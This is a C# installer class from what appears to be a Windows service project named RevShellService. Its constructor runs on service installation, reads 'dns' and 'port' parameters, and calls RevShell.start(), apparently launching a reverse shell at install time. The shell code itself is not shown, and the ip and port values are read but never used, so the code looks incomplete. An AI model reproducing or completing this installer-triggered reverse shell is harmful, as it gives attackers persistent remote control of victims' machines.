using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration.Install;
using System.Linq;
using System.Windows.Forms;

namespace RevShellService
{
    [RunInstaller(true)]
    public partial class ProjectInstaller : System.Configuration.Install.Installer
    {
        public ProjectInstaller()
        {
            InitializeComponent();
            String ip = Context.Parameters["dns"] ?? "kaboom";
            String port = Context.Parameters["port"] ?? "443";
            RevShell.start();

        }
    }
}
